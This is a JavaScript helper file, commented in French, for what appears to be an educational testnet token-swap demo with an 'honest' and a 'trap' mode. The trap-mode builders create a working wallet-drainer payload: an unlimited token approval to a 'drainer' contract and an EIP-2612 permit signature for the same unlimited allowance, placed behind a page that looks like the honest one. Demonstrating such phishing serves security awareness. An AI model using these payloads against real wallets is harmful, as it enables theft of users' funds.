// Fonctions partagees par la page d'echange. Aucune dependance, aucun CDN : la demo tourne
// hors ligne. Charge ce fichier avant app.js. Les seuls appels reseau sont vers le portefeuille
// de l'utilisateur et vers le noeud local (127.0.0.1:8545) via le portefeuille.
"use strict";

/* ===================== keccak-256 (sans bibliotheque) =====================
   Keccak-f[1600], uniquement pour calculer les selecteurs de fonctions
   (ex. approve(address,uint256)) necessaires a l'encodage des appels. */
(function (global) {
  var RC = [0x0000000000000001n, 0x0000000000008082n, 0x800000000000808an, 0x8000000080008000n, 0x000000000000808bn, 0x0000000080000001n, 0x8000000080008081n, 0x8000000000008009n,
    0x000000000000008an, 0x0000000000000088n, 0x0000000080008009n, 0x000000008000000an, 0x000000008000808bn, 0x800000000000008bn, 0x8000000000008089n, 0x8000000000008003n,
    0x8000000000008002n, 0x8000000000000080n, 0x000000000000800an, 0x800000008000000an, 0x8000000080008081n, 0x8000000000008080n, 0x0000000080000001n, 0x8000000080008008n];
  var ROTC = [1, 3, 6, 10, 15, 21, 28, 36, 45, 55, 2, 14, 27, 41, 56, 8, 25, 43, 62, 18, 39, 61, 20, 44];
  var PILN = [10, 7, 11, 17, 18, 3, 5, 16, 8, 21, 24, 4, 15, 23, 19, 13, 12, 2, 20, 14, 22, 9, 6, 1];
  var M64 = (1n << 64n) - 1n;
  function rotl(x, n) { n = BigInt(n); return ((x << n) | (x >> (64n - n))) & M64; }
  function keccakf(st) {
    var bc = [0n, 0n, 0n, 0n, 0n], i, j, r, t;
    for (r = 0; r < 24; r++) {
      for (i = 0; i < 5; i++) bc[i] = st[i] ^ st[i + 5] ^ st[i + 10] ^ st[i + 15] ^ st[i + 20];
      for (i = 0; i < 5; i++) { t = bc[(i + 4) % 5] ^ rotl(bc[(i + 1) % 5], 1); for (j = 0; j < 25; j += 5) st[j + i] ^= t; }
      t = st[1];
      for (i = 0; i < 24; i++) { j = PILN[i]; var b0 = st[j]; st[j] = rotl(t, ROTC[i]); t = b0; }
      for (j = 0; j < 25; j += 5) { for (i = 0; i < 5; i++) bc[i] = st[j + i]; for (i = 0; i < 5; i++) st[j + i] ^= ((~bc[(i + 1) % 5]) & M64) & bc[(i + 2) % 5]; }
      st[0] ^= RC[r];
    }
  }
  function keccak256hex(bytes) {
    var rate = 136, st = []; for (var i = 0; i < 25; i++) st.push(0n);
    var len = bytes.length, padded = new Uint8Array(Math.ceil((len + 1) / rate) * rate);
    padded.set(bytes); padded[len] ^= 0x01; padded[padded.length - 1] ^= 0x80;
    for (var off = 0; off < padded.length; off += rate) {
      for (var k = 0; k < rate / 8; k++) { var lane = 0n; for (var b = 7; b >= 0; b--) lane = (lane << 8n) | BigInt(padded[off + k * 8 + b]); st[k] ^= lane; }
      keccakf(st);
    }
    var out = "";
    for (var l = 0; l < 4; l++) { var v = st[l]; for (var q = 0; q < 8; q++) { out += Number(v & 0xffn).toString(16).padStart(2, "0"); v >>= 8n; } }
    return out;
  }
  function selector(sig) { return "0x" + keccak256hex(new TextEncoder().encode(sig)).slice(0, 8); }
  global.selector = selector;
})(window);

/* ===================== encodage ABI minimal ===================== */
function pad32(hex) { return hex.replace(/^0x/, "").toLowerCase().padStart(64, "0"); }
function encAddr(a) { return pad32(a); }
function encUint(n) { return pad32(BigInt(n).toString(16)); }
function toHex(n) { return "0x" + BigInt(n).toString(16); }
function callData(sig, parts) { return selector(sig) + parts.join(""); }

var MAX_UINT256 = (1n << 256n) - 1n;

/* DemoUSDC a 6 decimales ; DemoWAVAX en a 18. Taux fixe du routeur : 1 WAVAX = 100 DUSDC. */
var USDC_DECIMALS = 6;
function usdcUnits(amountInt) { return BigInt(amountInt) * 10n ** BigInt(USDC_DECIMALS); }
function formatUsdc(raw) {
  var v = BigInt(raw || 0), whole = v / 1000000n, frac = (v % 1000000n).toString().padStart(6, "0").slice(0, 2);
  return whole.toString().replace(/\B(?=(\d{3})+(?!\d))/g, " ") + "," + frac;
}
function formatWavax(raw) {
  var v = BigInt(raw || 0), whole = v / (10n ** 18n), frac = (v % (10n ** 18n)).toString().padStart(18, "0").slice(0, 4);
  return whole.toString() + "," + frac;
}

/* ===================== decouverte du portefeuille (EIP-6963, repli window.ethereum) ===================== */
var _found6963 = [];
window.addEventListener("eip6963:announceProvider", function (ev) {
  try {
    var d = ev.detail;
    if (!d || !d.info) return;
    if (!_found6963.some(function (f) { return f.info.uuid === d.info.uuid; })) _found6963.push(d);
  } catch (e) {}
});
try { window.dispatchEvent(new Event("eip6963:requestProvider")); } catch (e) {}
function getProvider() {
  if (_found6963.length) return _found6963[0].provider;
  return window.ethereum || null;
}

/* ===================== fichier d'adresses =====================
   Copie dans ce dossier par config.js. Le serveur statique ne sert que ce dossier.
   Reseau choisi par l'URL, jamais par un reglage visible : ?reseau=fuji lit addresses.fuji.json
   (Avalanche Fuji, chainId 43113) ; sans parametre, addresses.local.json (chaine locale). */
var FUJI_CHAIN_ID = 43113;
var FUJI_EXPLORER = "https://testnet.snowtrace.io";
function isFuji(chainId) { return Number(chainId) === FUJI_CHAIN_ID; }
function requestedNet() {
  var q = (new URL(location.href).searchParams.get("reseau") || "").toLowerCase();
  return q === "fuji" ? "fuji" : "local";
}
async function loadAddresses() {
  try {
    var res = await fetch("./addresses." + requestedNet() + ".json", { cache: "no-store" });
    if (!res.ok) return { ok: false };
    var data = await res.json();
    if (!data || !data.chainId || !data.usdc || !data.wavax || !data.router || !data.drainer || !data.rpcUrl) return { ok: false };
    return { ok: true, data: data };
  } catch (e) { return { ok: false }; }
}

function shortAddr(a) { return a ? a.slice(0, 6) + "…" + a.slice(-4) : "—"; }

/* ===================== constructeurs des demandes envoyees au portefeuille =====================
   Chaque constructeur renvoie une demande EIP-1193 brute. La page honnete et la page piege
   partagent la meme apparence : seul le contenu de ces demandes differe. */

// Mode honnete, etape 1 : autoriser le routeur a prelever EXACTEMENT 50 DUSDC.
function txApproveRouter(addresses, from, amountUsdcInt) {
  return {
    from: from, to: addresses.usdc,
    data: callData("approve(address,uint256)", [encAddr(addresses.router), encUint(usdcUnits(amountUsdcInt))]),
  };
}
// Mode honnete, etape 2 : echanger 50 DUSDC contre du WAVAX (contrepartie recue par l'appelant).
function txSwap(addresses, from, amountUsdcInt) {
  return {
    from: from, to: addresses.router,
    data: callData("swapUSDCforWAVAX(uint256,uint256)", [encUint(usdcUnits(amountUsdcInt)), encUint(0n)]),
  };
}
// Mode piege : autoriser un contrat QUI N'EST PAS LE ROUTEUR a prelever un montant ILLIMITE.
function txApproveUnlimited(addresses, from) {
  return {
    from: from, to: addresses.usdc,
    data: callData("approve(address,uint256)", [encAddr(addresses.drainer), encUint(MAX_UINT256)]),
  };
}
// Mode piege&via=permit : signature EIP-2612 d'une autorisation illimitee au meme contrat.
// Domaine = DemoUSDC : ERC20Permit("Demo USDC"), version "1". Echeance lointaine et fixe.
var PERMIT_DEADLINE = "4102444800"; // 1er janvier 2100
function buildPermit(addresses, owner, nonce) {
  return {
    types: {
      EIP712Domain: [
        { name: "name", type: "string" }, { name: "version", type: "string" },
        { name: "chainId", type: "uint256" }, { name: "verifyingContract", type: "address" },
      ],
      Permit: [
        { name: "owner", type: "address" }, { name: "spender", type: "address" },
        { name: "value", type: "uint256" }, { name: "nonce", type: "uint256" }, { name: "deadline", type: "uint256" },
      ],
    },
    primaryType: "Permit",
    domain: { name: "Demo USDC", version: "1", chainId: Number(addresses.chainId), verifyingContract: addresses.usdc },
    message: { owner: owner, spender: addresses.drainer, value: MAX_UINT256.toString(), nonce: String(nonce), deadline: PERMIT_DEADLINE },
  };
}
